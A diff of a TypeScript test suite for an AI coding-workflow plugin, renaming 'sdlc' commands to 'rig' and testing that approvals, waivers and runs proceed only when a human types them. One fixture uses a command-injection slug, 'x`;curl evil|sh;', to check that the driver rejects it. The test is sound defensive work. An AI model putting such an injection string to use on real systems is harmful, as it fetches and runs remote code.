@@ -19,13 +19,13 @@ function worldOf(on: On, { contextTokens = 50_000, costUsd = 1 } = {}) {
   const world = {
     commands: [] as string[], runs: [] as Run[], toasts: [] as string[], notices: [] as string[], costUsd, contextTokens,
     sensors: null as unknown,
-    step: { slug: 'add-login', node: 'build', verdict: 'continue', reason: '', command: '/sdlc:build add-login', round: 1 } as unknown,
+    step: { slug: 'add-login', node: 'build', verdict: 'continue', reason: '', command: '/rig:build add-login', round: 1 } as unknown,
     impact: { hold: false, slug: 'add-login', consumers: [] as string[], hits: 0 },
     fileFindings: [] as unknown[],
     standalone: false,
     vendoredMod: false,
     logs: [] as string[],
-    settings: '{"enabledPlugins":{"sdlc-mod@sdlc-local":true}}',
+    settings: '{"enabledPlugins":{"rig-mod@rig-local":true}}',
     partial: false,
     verdict: 'continue',
     prompts: [] as string[],
@@ -59,7 +59,7 @@ function worldOf(on: On, { contextTokens = 50_000, costUsd = 1 } = {}) {
   }))
   // .sdlc exists; the vendored approve skill exists only in a standalone repo.
   on('fs.exists', ($, e) => ({ value: JSON.stringify(e).includes('.sdlc/mod/') ? world.vendoredMod : !JSON.stringify(e).includes('.claude/skills/') || world.standalone }))
-  on('agent.list', () => ({ value: [{ id: 'a1', description: 'slice 1', type: 'sdlc:implementer', status: 'running' }] }))
+  on('agent.list', () => ({ value: [{ id: 'a1', description: 'slice 1', type: 'rig:implementer', status: 'running' }] }))
   on('ui.toast', ($, e) => {
     world.toasts.push(String(e.text ?? e))
     return { value: undefined }
@@ -86,7 +86,7 @@ describe('sdlc mod', () => {
   test('session start registers the zero-token commands', async ($, on) => {
     const world = worldOf(on)
     await $.session.start(SESSION)
-    expect(world.commands.sort()).toEqual(['sdlc-approve', 'sdlc-metrics-pane', 'sdlc-run', 'sdlc-sensors', 'sdlc-status', 'sdlc-story', 'sdlc-waive'])
+    expect(world.commands.sort()).toEqual(['rig-approve', 'rig-metrics-pane', 'rig-run', 'rig-sensors', 'rig-status', 'rig-story', 'rig-waive'])
   })
 
   test('the global plugin steps aside only when the vendored mod is present and enabled', async ($, on) => {
@@ -126,23 +126,23 @@ describe('sdlc mod', () => {
     const world = worldOf(on)
     world.standalone = true
     await $.session.start(SESSION)
-    expect(world.commands.sort()).toEqual(['sdlc-metrics-pane', 'sdlc-run', 'sdlc-sensors', 'sdlc-status', 'sdlc-story'])
+    expect(world.commands.sort()).toEqual(['rig-metrics-pane', 'rig-run', 'rig-sensors', 'rig-status', 'rig-story'])
   })
 
   test('approve runs the script as the human only when the person typed it', async ($, on) => {
     const world = worldOf(on)
     await $.session.start(SESSION)
 
-    const refused = await $.command.run(command('sdlc-approve', 'add-login plan', 'sdk'))
+    const refused = await $.command.run(command('rig-approve', 'add-login plan', 'sdk'))
     expect(refused.text).toContain('only when the person types it')
     expect(world.runs.some(r => r.argv.includes('approve'))).toBe(false)
 
-    const approved = await $.command.run(command('sdlc-approve', 'add-login plan'))
+    const approved = await $.command.run(command('rig-approve', 'add-login plan'))
     expect(approved.text).toContain('approved add-login plan')
     const run = world.runs.find(r => r.argv.includes('approve'))
     expect(run?.env).toEqual({ SDLC_HUMAN: '1' })
 
-    await $.command.run(command('sdlc-approve', 'add-login tier M feature'))
+    await $.command.run(command('rig-approve', 'add-login tier M feature'))
     const tier = world.runs.filter(r => r.argv.includes('approve')).at(-1)
     expect(tier?.argv.slice(-4)).toEqual(['add-login', 'tier', 'M', 'feature'])
     expect(tier?.env).toEqual({ SDLC_HUMAN: '1' })
@@ -194,8 +194,8 @@ describe('sdlc mod', () => {
   test('waive runs the script as the human only when the person typed it', async ($, on) => {
     const world = worldOf(on)
     await $.session.start(SESSION)
-    expect((await $.command.run(command('sdlc-waive', 'size * generated', 'sdk'))).text).toContain('only when the person types it')
-    await $.command.run(command('sdlc-waive', 'size * generated'))
+    expect((await $.command.run(command('rig-waive', 'size * generated', 'sdk'))).text).toContain('only when the person types it')
+    await $.command.run(command('rig-waive', 'size * generated'))
     expect(world.runs.find(r => r.argv.includes('waive'))?.env).toEqual({ SDLC_HUMAN: '1' })
   })
 
@@ -222,17 +222,17 @@ describe('sdlc mod', () => {
     const world = worldOf(on)
     world.sensors = { blocks: 1, warns: 0, bySensor: { 'test-tamper': 1 }, unresolved: 1, knownRed: 0, waivers: 0 }
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-waive', 'size * generated'))
+    await $.command.run(command('rig-waive', 'size * generated'))
     const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'AbovePrompt', props: { hasSurvey: false, isWorking: false, maxRows: 5, bodyColumns: 120, scroll: { offset: 0, bodyRows: 5 }, view: {} }, viewport: { columns: 120, rows: 30 } })
     expect(JSON.stringify(await ui.drawn())).toContain('test-tamper(1)')
     await ui.unmount()
   })
 
-  test('the sensors pane shows the report from /sdlc-sensors', async ($, on) => {
+  test('the sensors pane shows the report from /rig-sensors', async ($, on) => {
     worldOf(on)
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-sensors'))
-    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'sdlc-sensors', props: { title: 'sdlc sensors', isFocused: false, bodyColumns: 120, placement: 'inline', scroll: { offset: 0, bodyRows: 10 }, view: {} }, viewport: { columns: 120, rows: 30 } })
+    await $.command.run(command('rig-sensors'))
+    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'rig-sensors', props: { title: 'sdlc sensors', isFocused: false, bodyColumns: 120, placement: 'inline', scroll: { offset: 0, bodyRows: 10 }, view: {} }, viewport: { columns: 120, rows: 30 } })
     expect(JSON.stringify(await ui.drawn())).toContain('last gate: 0 block(s)')
     await ui.unmount()
   })
@@ -256,11 +256,11 @@ describe('sdlc mod', () => {
     world.verdict = 'blocked'
     world.step = { slug: 'add-login', node: 'build', verdict: 'blocked', reason: 'sensors red', command: '', round: 1 }
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-story'))
+    await $.command.run(command('rig-story'))
     const band = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'AbovePrompt', props: bandProps, viewport: { columns: 160, rows: 30 } })
     expect(JSON.stringify(await band.drawn())).toContain('⛔')
     await band.unmount()
-    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'sdlc-story', props: paneProps, viewport: { columns: 120, rows: 30 } })
+    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'rig-story', props: paneProps, viewport: { columns: 120, rows: 30 } })
     expect(JSON.stringify(await ui.drawn())).toContain('blocked: sensors red')
     await ui.unmount()
   })
@@ -269,23 +269,23 @@ describe('sdlc mod', () => {
     const world = worldOf(on)
     world.partial = true
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-story'))
-    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'sdlc-story', props: paneProps, viewport: { columns: 120, rows: 30 } })
+    await $.command.run(command('rig-story'))
+    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'rig-story', props: paneProps, viewport: { columns: 120, rows: 30 } })
     expect(JSON.stringify(await ui.drawn())).toContain('add-login')
     await ui.unmount()
     const s = { slug: 'a', node: 'build', verdict: 'blocked', round: 1, cap: 2 } as Story
-    const step = (verdict: StepInfo['verdict']): StepInfo => ({ slug: 'a', node: 'build', verdict, reason: 'why', command: '/sdlc:approve a', round: 1 })
+    const step = (verdict: StepInfo['verdict']): StepInfo => ({ slug: 'a', node: 'build', verdict, reason: 'why', command: '/rig:approve a', round: 1 })
     expect(storyText(s)).toContain('build ⟲1/2 ⛔')
     expect(storyPaneText(s, step('blocked'))).toContain('blocked: why')
-    expect(storyPaneText(s, step('human'))).toContain('waiting at gate: /sdlc:approve a')
+    expect(storyPaneText(s, step('human'))).toContain('waiting at gate: /rig:approve a')
   })
 
-  test('/sdlc-story opens the story pane with cost per node, budget and autonomy', async ($, on) => {
+  test('/rig-story opens the story pane with cost per node, budget and autonomy', async ($, on) => {
     const world = worldOf(on)
     await $.session.start(SESSION)
-    expect(world.commands).toContain('sdlc-story')
-    await $.command.run(command('sdlc-story'))
-    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'sdlc-story', props: paneProps, viewport: { columns: 120, rows: 30 } })
+    expect(world.commands).toContain('rig-story')
+    await $.command.run(command('rig-story'))
+    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'rig-story', props: paneProps, viewport: { columns: 120, rows: 30 } })
     const text = JSON.stringify(await ui.drawn())
     expect(text).toContain('build  ')
     expect(text).toContain('auto-approved 14')
@@ -293,12 +293,12 @@ describe('sdlc mod', () => {
     await ui.unmount()
   })
 
-  test('/sdlc-metrics-pane shows the metrics report', async ($, on) => {
+  test('/rig-metrics-pane shows the metrics report', async ($, on) => {
     const world = worldOf(on)
     await $.session.start(SESSION)
-    expect(world.commands).toContain('sdlc-metrics-pane')
-    await $.command.run(command('sdlc-metrics-pane'))
-    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'sdlc-metrics', props: paneProps, viewport: { columns: 120, rows: 30 } })
+    expect(world.commands).toContain('rig-metrics-pane')
+    await $.command.run(command('rig-metrics-pane'))
+    const ui = await $.ui.mount({ plugin: 'sdlc', surface: 'terminal', component: 'Pane', requestId: 'rig-metrics', props: paneProps, viewport: { columns: 120, rows: 30 } })
     expect(JSON.stringify(await ui.drawn())).toContain('value/cost 9.5x')
     await ui.unmount()
   })
@@ -334,16 +334,16 @@ describe('sdlc mod', () => {
     expect(world.runs.some(r => r.argv.includes('approve'))).toBe(false)
   })
 
-  test('/sdlc-run submits the next node as a prompt, and continues after each turn', async ($, on) => {
+  test('/rig-run submits the next node as a prompt, and continues after each turn', async ($, on) => {
     const world = worldOf(on)
     const clock = mock.clock(on)
     on('turn.complete', () => ({ text: '' }))
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     expect(world.prompts.at(-1)).toContain('skill build add-login')
     expect(world.prompts.at(-1)).toContain('then stop')
-    world.step = { slug: 'add-login', node: 'test', verdict: 'continue', reason: '', command: '/sdlc:test add-login', round: 0 }
+    world.step = { slug: 'add-login', node: 'test', verdict: 'continue', reason: '', command: '/rig:test add-login', round: 0 }
     await $.turn.complete({ answer: '', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
     expect(world.prompts.at(-1)).toContain('skill test add-login')
   })
@@ -353,7 +353,7 @@ describe('sdlc mod', () => {
     const clock = mock.clock(on)
     on('turn.complete', () => ({ text: '' }))
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     await $.turn.complete({ answer: '', durationMs: 1, isAborted: false, reason: 'answer', turnId: 't1' })
     expect(world.prompts.length).toBe(1)
@@ -365,10 +365,10 @@ describe('sdlc mod', () => {
     const clock = mock.clock(on)
     on('turn.complete', () => ({ text: '' }))
     await $.session.start(SESSION)
-    const refused = await $.command.run(command('sdlc-run', '', 'sdk'))
+    const refused = await $.command.run(command('rig-run', '', 'sdk'))
     expect(refused.text).toContain('only when the person types it')
     expect(world.prompts.length).toBe(0)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     world.step = { slug: 'add-login', node: 'test', verdict: 'continue', reason: '', command: '', round: 0 }
     await $.turn.complete({ answer: '', durationMs: 1, isAborted: true, reason: 'answer', turnId: 't1' })
@@ -379,17 +379,17 @@ describe('sdlc mod', () => {
   test('at a human gate the driver asks; only the person\'s choice approves', async ($, on) => {
     const world = worldOf(on)
     const clock = mock.clock(on)
-    world.step = { slug: 'add-login', node: 'plan', verdict: 'human', reason: 'human gate', command: 'human gate: review add-login/plan.md, then run /sdlc-approve add-login plan', round: 0 }
+    world.step = { slug: 'add-login', node: 'plan', verdict: 'human', reason: 'human gate', command: 'human gate: review add-login/plan.md, then run /rig-approve add-login plan', round: 0 }
     world.answer = 'Not yet'
     on('tool.call', ($2, e) =>
       e.tool === 'AskUserQuestion' ? { result: { questions: e.questions, answers: Object.fromEntries(e.questions.map(q => [q.question, world.answer])) } } : { result: 'edited' },
     )
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     expect(world.runs.some(r => r.argv.includes('approve'))).toBe(false)
     world.answer = 'Approve plan'
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     const run = world.runs.find(r => r.argv.includes('approve'))
     expect(run?.argv).toContain('plan')
@@ -399,7 +399,7 @@ describe('sdlc mod', () => {
   test('a turn that ends at the design gate asks once and approves design only on a yes', async ($, on) => {
     const world = worldOf(on)
     on('turn.complete', () => ({ text: '' }))
-    world.step = { slug: 'add-login', node: 'design', verdict: 'human', reason: 'human gate', command: 'human gate: review add-login/intent.md and add-login/design.md, then run /sdlc-approve add-login design', round: 0 }
+    world.step = { slug: 'add-login', node: 'design', verdict: 'human', reason: 'human gate', command: 'human gate: review add-login/intent.md and add-login/design.md, then run /rig-approve add-login design', round: 0 }
     world.answer = 'Not yet'
     on('tool.call', ($2, e) =>
       e.tool === 'AskUserQuestion' ? { result: { questions: e.questions, answers: Object.fromEntries(e.questions.map(q => [q.question, world.answer])) } } : { result: 'edited' },
@@ -417,10 +417,10 @@ describe('sdlc mod', () => {
   test('the driver runs the sensors node itself at zero tokens and prompts only for the next node', async ($, on) => {
     const world = worldOf(on)
     const clock = mock.clock(on)
-    world.step = { slug: 'add-login', node: 'sensors', verdict: 'continue', reason: '', command: '/sdlc:sensors add-login', round: 0 }
-    world.afterQuality = { slug: 'add-login', node: 'pr', verdict: 'continue', reason: '', command: '/sdlc:pr add-login', round: 0 }
+    world.step = { slug: 'add-login', node: 'sensors', verdict: 'continue', reason: '', command: '/rig:sensors add-login', round: 0 }
+    world.afterQuality = { slug: 'add-login', node: 'pr', verdict: 'continue', reason: '', command: '/rig:pr add-login', round: 0 }
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     expect(world.runs.some(r => r.argv.includes('quality'))).toBe(true)
     expect(world.prompts).toHaveLength(1)
@@ -433,7 +433,7 @@ describe('sdlc mod', () => {
     world.verdict = 'blocked'
     world.step = { slug: 'add-login', node: 'build', verdict: 'blocked', reason: 'build: stall', command: '', round: 2 }
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     expect(world.prompts.length).toBe(0)
     expect(world.toasts.at(-1)).toContain('blocked: build: stall')
@@ -444,7 +444,7 @@ describe('sdlc mod', () => {
     const clock = mock.clock(on)
     world.step = { slug: 'x`;curl evil|sh;', node: 'build', verdict: 'continue', reason: '', command: '', round: 1 }
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     expect(world.prompts.length).toBe(0)
     expect(world.toasts.at(-1)).toContain('unknown change or node')
@@ -456,7 +456,7 @@ describe('sdlc mod', () => {
     on('turn.complete', () => ({ text: '' }))
     world.step = null
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     world.step = { slug: 'add-login', node: 'build', verdict: 'continue', reason: '', command: '', round: 1 }
     await $.turn.complete({ answer: '', durationMs: 1, isAborted: false, reason: 'answer', turnId: 't1' })
@@ -470,7 +470,7 @@ describe('sdlc mod', () => {
     world.step = { slug: 'add-login', node: 'build', verdict: 'continue', reason: '', command: '', round: 1 }
     world.rejectSubmit = true
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     world.rejectSubmit = false
     await $.turn.complete({ answer: '', durationMs: 1, isAborted: false, reason: 'answer', turnId: 't1' })
@@ -483,7 +483,7 @@ describe('sdlc mod', () => {
     on('clock.after', () => { throw new Error('no timer') })
     on('turn.complete', () => ({ text: '' }))
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await $.turn.complete({ answer: '', durationMs: 1, isAborted: false, reason: 'answer', turnId: 't1' })
     expect(world.prompts.length).toBe(0)
   })
@@ -494,7 +494,7 @@ describe('sdlc mod', () => {
     on('turn.complete', () => ({ text: '' }))
     world.step = { slug: 'add-login', node: 'build', verdict: 'continue', reason: '', command: '', round: 0, progress: 0 }
     await $.session.start(SESSION)
-    await $.command.run(command('sdlc-run'))
+    await $.command.run(command('rig-run'))
     await clock.advance(1)
     world.step = { slug: 'add-login', node: 'build', verdict: 'continue', reason: '', command: '', round: 0, progress: 1 }
     await $.turn.complete({ answer: '', durationMs: 1, isAborted: false, reason: 'answer', turnId: 't1' })
